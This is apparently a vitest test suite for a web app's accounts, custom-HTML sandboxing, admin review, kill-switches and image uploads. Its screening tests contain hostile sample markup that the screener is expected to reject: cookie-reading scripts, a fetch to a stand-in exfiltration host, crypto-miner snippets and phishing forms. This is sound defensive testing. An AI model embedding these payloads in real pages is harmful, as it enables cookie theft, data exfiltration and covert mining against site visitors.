import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { eq } from 'drizzle-orm';
import { db, pool, schema } from '../src/db/client.js';
import { closeRedis } from '../src/lib/redis.js';
import { screenCustomHtml } from '../src/lib/html.js';
import { hashPassword, verifyPassword } from '../src/lib/crypto.js';
import type { App } from '../src/app.js';
import { freeRect, getApp, login } from './helpers.js';

let app: App;
beforeAll(async () => {
  app = await getApp();
});
afterAll(async () => {
  await app.close();
  await pool.end();
  await closeRedis();
});
const json = (res: { body: string }) => JSON.parse(res.body);

describe('passwords (optional)', () => {
  it('hashes with scrypt and verifies', async () => {
    const h = await hashPassword('correct horse battery');
    expect(h.startsWith('scrypt$')).toBe(true);
    expect(await verifyPassword('correct horse battery', h)).toBe(true);
    expect(await verifyPassword('wrong', h)).toBe(false);
    expect(await verifyPassword('anything', null)).toBe(false);
  });

  it('sets a first password only with a fresh emailed code, then signs in with it', async () => {
    const email = `pw-${Date.now()}@test.dev`;
    const u = await login(email);
    const noCode = await app.inject({ method: 'PUT', url: '/v1/me/password', headers: u.headers, payload: { password: 'a-long-password-1' } });
    expect(noCode.statusCode).toBe(400);
    const { devCode } = json(await app.inject({ method: 'POST', url: '/v1/auth/request-code', payload: { email } }));
    const set = await app.inject({ method: 'PUT', url: '/v1/me/password', headers: u.headers, payload: { password: 'a-long-password-1', code: devCode } });
    expect(set.statusCode).toBe(200);
    expect((await app.inject({ method: 'POST', url: '/v1/auth/password-login', payload: { email, password: 'nope-nope-nope' } })).statusCode).toBe(400);
    const ok = await app.inject({ method: 'POST', url: '/v1/auth/password-login', payload: { email, password: 'a-long-password-1' } });
    expect(ok.statusCode).toBe(200);
    expect(json(ok).user.hasPassword).toBe(true);
    expect(ok.headers['set-cookie']).toBeTruthy();
    // changing needs the current password
    const bad = await app.inject({ method: 'PUT', url: '/v1/me/password', headers: u.headers, payload: { password: 'another-long-pass-2', current: 'x' } });
    expect(bad.statusCode).toBe(400);
  });

  it('stores an avatar', async () => {
    const u = await login();
    const res = json(await app.inject({ method: 'PATCH', url: '/v1/me', headers: u.headers, payload: { avatar: { face: '🦊', color: '#ff8800' } } }));
    expect(res.user.avatar).toEqual({ face: '🦊', color: '#ff8800' });
  });
});

describe('custom HTML', () => {
  it('screens dangerous markup', () => {
    expect(screenCustomHtml('<h1>Hello</h1><p style="color:red">hi</p>').ok).toBe(true);
    expect(screenCustomHtml('<script>document.cookie</script>').ok).toBe(false);
    expect(screenCustomHtml('<script src="https://evil.example/x.js"></script>').ok).toBe(false);
    expect(screenCustomHtml('<script>top.location="https://evil"</script>').ok).toBe(false);
    expect(screenCustomHtml('<iframe src="https://evil.example"></iframe>').ok).toBe(false);
    expect(screenCustomHtml('<iframe src="https://www.youtube.com/embed/abc"></iframe>').ok).toBe(true);
  });

  it('G8 scan: 200 KB limit, miners, credential forms, script hosts and connect hosts outside the allowlists', () => {
    expect(screenCustomHtml('x'.repeat(199_000)).ok).toBe(true);
    expect(screenCustomHtml('x'.repeat(200_001)).reasons).toContain('is larger than 200 KB');
    expect(screenCustomHtml('é'.repeat(100_001)).ok).toBe(false); // bytes, not characters
    expect(screenCustomHtml('<script>var m = new CoinHive.Anonymous("k"); m.start()</script>').reasons).toContain('looks like a crypto miner');
    expect(screenCustomHtml('<script>const miner = new WebMiner("x")</script>').reasons).toContain('looks like a crypto miner');
    expect(screenCustomHtml('<script>connect("stratum+tcp://pool.example:3333")</script>').reasons).toContain('looks like a crypto miner');
    expect(screenCustomHtml('<form><input type="password" name="p"></form>').reasons).toContain('asks for passwords');
    expect(screenCustomHtml('<input name="card-number">').reasons).toContain('asks for card, bank or wallet details');
    expect(screenCustomHtml('<p>Please enter your seed phrase to claim</p>').reasons).toContain('asks for credentials');
    expect(screenCustomHtml('<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>').ok).toBe(true);
    expect(screenCustomHtml('<script src="http://cdn.jsdelivr.net/x.js"></script>').ok).toBe(false); // https only
    expect(screenCustomHtml('<script src="//evil.example/x.js"></script>').reasons.join()).toMatch(/loads a script from/);
    expect(screenCustomHtml('<script>fetch("https://api.evil.example/steal")</script>').reasons.join()).toMatch(/connects to api.evil.example/);
    process.env.USERCONTENT_CONNECT_HOSTS = 'api.weather.example';
    try {
      expect(screenCustomHtml('<script>fetch("https://api.weather.example/today")</script>').ok).toBe(true);
    } finally {
      delete process.env.USERCONTENT_CONNECT_HOSTS;
    }
  });

  it('is a paid feature, screened, versioned, and reviewed by a human on the first publish', async () => {
    const owner = await login();
    const admin = await login(undefined, 'admin');
    const plot = json(await app.inject({ method: 'POST', url: '/v1/plots/claim', headers: owner.headers, payload: { rect: freeRect() } })).plot;
    await app.inject({ method: 'POST', url: `/v1/plots/${plot.id}/publish`, headers: owner.headers });
    expect((await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { customHtml: '<h1>Hi</h1>' } })).statusCode).toBe(402);

    await db.update(schema.users).set({ plan: 'plus' }).where(eq(schema.users.id, owner.user.id));
    expect((await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { customHtml: '<script>eval("1")</script>' } })).statusCode).toBe(400);
    expect((await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { customHtml: 'x'.repeat(200_001) } })).statusCode).toBe(400);

    // First publish: saved as version 1, waiting for review, not visible yet.
    const first = json(await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { customHtml: '<h1>Welcome</h1>' } }));
    expect(first.customHtml).toMatchObject({ version: 1, status: 'review' });
    expect(first.plot.customHtmlStatus).toBe('review');
    expect(first.plot.hasCustomHtml).toBe(false);
    expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox` })).statusCode).toBe(404);

    // Only editors see the source and the versions; only admins see the queue.
    const view = json(await app.inject({ url: `/v1/plots/${plot.slug}` }));
    expect(view.plot.customHtml).toBeUndefined();
    const stranger = await login();
    expect((await app.inject({ url: `/v1/plots/${plot.id}/custom-html/versions`, headers: stranger.headers })).statusCode).toBe(403);
    expect((await app.inject({ url: `/v1/plots/${plot.id}/custom-html/versions` })).statusCode).toBe(401);
    expect((await app.inject({ url: '/v1/admin/custom-html', headers: owner.headers })).statusCode).toBe(403);

    const queue = json(await app.inject({ url: '/v1/admin/custom-html', headers: admin.headers }));
    const item = queue.queue.find((q: { plotId: string }) => q.plotId === plot.id);
    expect(item.notes).toContain('First publish of custom HTML on this plot');
    expect((await app.inject({ method: 'POST', url: `/v1/admin/custom-html/versions/${item.id}/review`, headers: owner.headers, payload: { decision: 'approve' } })).statusCode).toBe(403);
    const preview = json(await app.inject({ method: 'POST', url: `/v1/admin/custom-html/versions/${item.id}/preview`, headers: admin.headers }));
    expect((await app.inject({ url: new URL(preview.url).pathname.replace(/^\/api/, '') })).body).toContain('<h1>Welcome</h1>');
    expect(json(await app.inject({ method: 'POST', url: `/v1/admin/custom-html/versions/${item.id}/review`, headers: admin.headers, payload: { decision: 'approve' } })).status).toBe('approved');

    // Live: served as its own sandboxed document.
    const live = json(await app.inject({ url: `/v1/plots/${plot.slug}` }));
    expect(live.plot.hasCustomHtml).toBe(true);
    expect(live.plot.customHtmlUrl).toMatch(new RegExp(`/v1/plots/${plot.id}/sandbox\\?v=1$`));
    const doc = await app.inject({ url: `/v1/plots/${plot.id}/sandbox` });
    expect(doc.statusCode).toBe(200);
    expect(doc.body).toContain('<h1>Welcome</h1>');

    // Later saves by an approved plot go live at once, as new versions; restore makes another version.
    const second = json(await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { customHtml: '<h1>Welcome back</h1>' } }));
    expect(second.customHtml).toMatchObject({ version: 2, status: 'live' });
    expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox` })).body).toContain('Welcome back');
    const versions = json(await app.inject({ url: `/v1/plots/${plot.id}/custom-html/versions`, headers: owner.headers }));
    expect(versions.versions.map((v: { version: number; status: string }) => `${v.version}:${v.status}`)).toEqual(['2:approved', '1:approved']);
    const restored = json(await app.inject({ method: 'POST', url: `/v1/plots/${plot.id}/custom-html/versions/1/restore`, headers: owner.headers }));
    expect(restored.customHtml).toMatchObject({ version: 3, status: 'live' });
    expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox` })).body).toContain('<h1>Welcome</h1>');
    expect((await app.inject({ method: 'POST', url: `/v1/plots/${plot.id}/custom-html/versions/1/restore`, headers: stranger.headers })).statusCode).toBe(403);
  });

  it('a rejected first publish never goes live', async () => {
    const owner = await login();
    const admin = await login(undefined, 'admin');
    await db.update(schema.users).set({ plan: 'plus' }).where(eq(schema.users.id, owner.user.id));
    const plot = json(await app.inject({ method: 'POST', url: '/v1/plots/claim', headers: owner.headers, payload: { rect: freeRect() } })).plot;
    json(await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { customHtml: '<h1>Buy now</h1>' } }));
    const item = json(await app.inject({ url: '/v1/admin/custom-html', headers: admin.headers })).queue.find((q: { plotId: string }) => q.plotId === plot.id);
    await app.inject({ method: 'POST', url: `/v1/admin/custom-html/versions/${item.id}/review`, headers: admin.headers, payload: { decision: 'reject', note: 'Spam' } });
    const view = json(await app.inject({ url: `/v1/plots/${plot.id}`, headers: owner.headers }));
    expect(view.plot.customHtmlStatus).toBe('rejected');
    expect(view.plot.hasCustomHtml).toBe(false);
    expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox` })).statusCode).toBe(404);
  });

  it('kill-switches: per plot, global, and three reports pause it', async () => {
    const owner = await login();
    const admin = await login(undefined, 'admin');
    const plot = json(await app.inject({ method: 'POST', url: '/v1/plots/claim', headers: owner.headers, payload: { rect: freeRect() } })).plot;
    await db.update(schema.plots).set({ customHtml: '<p>hi</p>', customHtmlLive: '<p>hi</p>', customHtmlStatus: 'live', customHtmlVersion: 1 }).where(eq(schema.plots.id, plot.id));
    const served = () => app.inject({ url: `/v1/plots/${plot.id}/sandbox` }).then((r) => r.statusCode);
    expect(await served()).toBe(200);

    expect((await app.inject({ method: 'POST', url: `/v1/admin/plots/${plot.id}/custom-html`, headers: owner.headers, payload: { disabled: true } })).statusCode).toBe(403);
    await app.inject({ method: 'POST', url: `/v1/admin/plots/${plot.id}/custom-html`, headers: admin.headers, payload: { disabled: true } });
    expect(await served()).toBe(404);
    await app.inject({ method: 'POST', url: `/v1/admin/plots/${plot.id}/custom-html`, headers: admin.headers, payload: { disabled: false } });
    expect(await served()).toBe(200);

    expect((await app.inject({ method: 'POST', url: '/v1/admin/custom-html/global', headers: owner.headers, payload: { disabled: true } })).statusCode).toBe(403);
    await app.inject({ method: 'POST', url: '/v1/admin/custom-html/global', headers: admin.headers, payload: { disabled: true } });
    try {
      expect(await served()).toBe(404);
      expect(json(await app.inject({ url: `/v1/plots/${plot.id}` })).plot.hasCustomHtml).toBe(false);
    } finally {
      await app.inject({ method: 'POST', url: '/v1/admin/custom-html/global', headers: admin.headers, payload: { disabled: false } });
    }
    expect(await served()).toBe(200);

    for (let i = 0; i < 3; i++) {
      const r = await login();
      const res = json(await app.inject({ method: 'POST', url: `/v1/plots/${plot.id}/report`, headers: r.headers, payload: { reason: 'Scam popup', about: 'custom_html' } }));
      expect(res.paused).toBe(i === 2);
    }
    expect(await served()).toBe(404);
  });

  it('serves documents in an opaque-origin sandbox that only our pages may frame', async () => {
    const owner = await login();
    const plot = json(await app.inject({ method: 'POST', url: '/v1/plots/claim', headers: owner.headers, payload: { rect: freeRect() } })).plot;
    await db.update(schema.plots).set({ customHtmlLive: '<h1>Hi</h1>', customHtmlStatus: 'live', customHtmlVersion: 1 }).where(eq(schema.plots.id, plot.id));
    const res = await app.inject({ url: `/v1/plots/${plot.id}/sandbox` });
    expect(res.headers['content-type']).toMatch(/text\/html/);
    const csp = String(res.headers['content-security-policy']);
    expect(csp).toMatch(/^sandbox allow-scripts;/); // opaque origin even when opened directly
    expect(csp).not.toMatch(/allow-same-origin|allow-top-navigation|allow-forms|allow-popups/);
    expect(csp).toMatch(/connect-src 'none'/);
    expect(csp).toMatch(/script-src 'unsafe-inline' https:\/\/cdnjs.cloudflare.com/);
    expect(csp).toMatch(/frame-ancestors http/);
    expect(res.headers['x-frame-options']).toBeUndefined();
    expect(res.headers['x-robots-tag']).toMatch(/noindex/);
    await db.update(schema.plots).set({ moderationStatus: 'flagged' }).where(eq(schema.plots.id, plot.id));
    expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox` })).statusCode).toBe(404);
  });

  it('previews drafts through short-lived tokens, for signed-in users only, screened', async () => {
    expect((await app.inject({ method: 'POST', url: '/v1/sandbox/preview', payload: { html: '<b>x</b>' } })).statusCode).toBe(401);
    const u = await login();
    const ok = json(await app.inject({ method: 'POST', url: '/v1/sandbox/preview', headers: u.headers, payload: { html: '<b>hello</b>' } }));
    expect(ok.ok).toBe(true);
    const path = new URL(ok.url).pathname.replace(/^\/api/, '');
    expect(path).toMatch(/^\/v1\/sandbox\/preview\/[A-Za-z0-9_-]{32}$/);
    const doc = await app.inject({ url: path }); // no cookies needed: the token is the capability
    expect(String(doc.headers['content-security-policy'])).toMatch(/^sandbox allow-scripts;/);
    expect(doc.headers['cache-control']).toBe('no-store');
    expect(doc.body).toContain('<b>hello</b>');
    const bad = json(await app.inject({ method: 'POST', url: '/v1/sandbox/preview', headers: u.headers, payload: { html: '<script>alert(document.cookie)</script>' } }));
    expect(bad.ok).toBe(false);
    const badDoc = await app.inject({ url: new URL(bad.url).pathname.replace(/^\/api/, '') });
    expect(badDoc.body).toMatch(/can’t be published: reads cookies/);
    expect(badDoc.body).not.toContain('alert(document.cookie)');
    expect((await app.inject({ url: '/v1/sandbox/preview/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' })).statusCode).toBe(404);
  });

  it('keeps the usercontent origin apart from the site: documents only, no cookies, and none on the site host', async () => {
    const { config } = await import('../src/config.js');
    const owner = await login();
    const plot = json(await app.inject({ method: 'POST', url: '/v1/plots/claim', headers: owner.headers, payload: { rect: freeRect() } })).plot;
    await db.update(schema.plots).set({ customHtmlLive: '<p>uc</p>', customHtmlStatus: 'live', customHtmlVersion: 1 }).where(eq(schema.plots.id, plot.id));
    const before = config.USERCONTENT_URL;
    config.USERCONTENT_URL = 'https://usercontent.flatmeta.test';
    try {
      const uc = { host: 'usercontent.flatmeta.test' };
      expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox`, headers: uc })).statusCode).toBe(200);
      // Nothing else answers there, signed in or not.
      expect((await app.inject({ url: '/v1/me', headers: { ...uc, cookie: String(owner.headers.cookie ?? '') } })).statusCode).toBe(404);
      expect((await app.inject({ method: 'POST', url: '/v1/sandbox/preview', headers: { ...uc, ...owner.headers, host: uc.host }, payload: { html: '<b>x</b>' } })).statusCode).toBe(404);
      // The site's own host refuses the documents, so owner code never runs on it.
      expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox`, headers: { host: 'www.flatmeta.test' } })).statusCode).toBe(404);
      expect((await app.inject({ url: `/v1/plots/${plot.id}/sandbox`, headers: { host: 'www.flatmeta.test', 'x-forwarded-host': uc.host } })).statusCode).toBe(404);
      // Views and previews point at the usercontent origin.
      expect(json(await app.inject({ url: `/v1/plots/${plot.id}` })).plot.customHtmlUrl).toMatch(/^https:\/\/usercontent\.flatmeta\.test\/v1\/plots\//);
      expect(json(await app.inject({ method: 'POST', url: '/v1/sandbox/preview', headers: owner.headers, payload: { html: '<b>x</b>' } })).url).toMatch(/^https:\/\/usercontent\.flatmeta\.test\/v1\/sandbox\/preview\//);
    } finally {
      config.USERCONTENT_URL = before;
    }
  });
});

describe('personalising land (G7)', () => {
  const multipart = (name: string, data: Buffer, type: string) => {
    const boundary = '----fmtest' + Math.random().toString(36).slice(2);
    const body = Buffer.concat([
      Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${name}"\r\nContent-Type: ${type}\r\n\r\n`),
      data,
      Buffer.from(`\r\n--${boundary}--\r\n`),
    ]);
    return { payload: body, headers: { 'content-type': `multipart/form-data; boundary=${boundary}` } };
  };

  it('strips EXIF (incl. GPS) and resizes uploads, rejects non-images, and lets owners remove one gallery image', async () => {
    const sharp = (await import('sharp')).default;
    const { config } = await import('../src/config.js');
    const path = await import('node:path');
    const { readFile } = await import('node:fs/promises');
    const owner = await login();
    const plot = json(await app.inject({ method: 'POST', url: '/v1/plots/claim', headers: owner.headers, payload: { rect: freeRect() } })).plot;
    const jpeg = await sharp({ create: { width: 2400, height: 1600, channels: 3, background: '#3366cc' } })
      .jpeg()
      .withExif({ IFD0: { Make: 'SecretCam', Copyright: 'me' }, IFD3: { GPSLatitudeRef: 'N', GPSLatitude: '51/1 30/1 0/1', GPSLongitudeRef: 'W', GPSLongitude: '0/1 7/1 0/1' } })
      .toBuffer();
    expect((await sharp(jpeg).metadata()).exif).toBeTruthy(); // the original has EXIF
    const mp = multipart('photo.jpg', jpeg, 'image/jpeg');
    const res = await app.inject({ method: 'POST', url: `/v1/plots/${plot.id}/media?use=gallery`, headers: { ...owner.headers, ...mp.headers }, payload: mp.payload });
    expect(res.statusCode, res.body).toBe(200);
    const url: string = json(res).plot.gallery.at(-1);
    const prefix = config.MEDIA_PUBLIC_URL.replace(/\/$/, '') + '/';
    const stored = await readFile(path.resolve(config.MEDIA_DIR, url.slice(url.indexOf(prefix) + prefix.length)));
    const meta = await sharp(stored).metadata();
    expect(meta.format).toBe('webp');
    expect(meta.exif).toBeUndefined();
    expect(meta.width).toBeLessThanOrEqual(1600);

    const notImage = multipart('x.svg', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), 'image/svg+xml');
    expect((await app.inject({ method: 'POST', url: `/v1/plots/${plot.id}/media`, headers: { ...owner.headers, ...notImage.headers }, payload: notImage.payload })).statusCode).toBe(400);
    const stranger = await login();
    expect((await app.inject({ method: 'POST', url: `/v1/plots/${plot.id}/media`, headers: { ...stranger.headers, ...mp.headers }, payload: mp.payload })).statusCode).toBe(403);

    const removed = json(await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { galleryRemove: url } }));
    expect(removed.plot.gallery).not.toContain(url);
  });

  it('rate-limits edits per minute and caps them per day', async () => {
    const owner = await login();
    const plot = json(await app.inject({ method: 'POST', url: '/v1/plots/claim', headers: owner.headers, payload: { rect: freeRect() } })).plot;
    const edit = await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { tagline: 'Hello' } });
    expect(edit.statusCode).toBe(200);
    const { redis, key } = await import('../src/lib/redis.js');
    const { dayKey } = await import('../src/game/dates.js');
    await redis.set(key('cap', 'plot-edit', owner.user.id, dayKey()), '300', 'EX', 60);
    const capped = await app.inject({ method: 'PATCH', url: `/v1/plots/${plot.id}`, headers: owner.headers, payload: { tagline: 'Again' } });
    expect(capped.statusCode).toBe(429);
    expect(capped.body).toMatch(/today's limit of 300 plot edits/);
  });
});
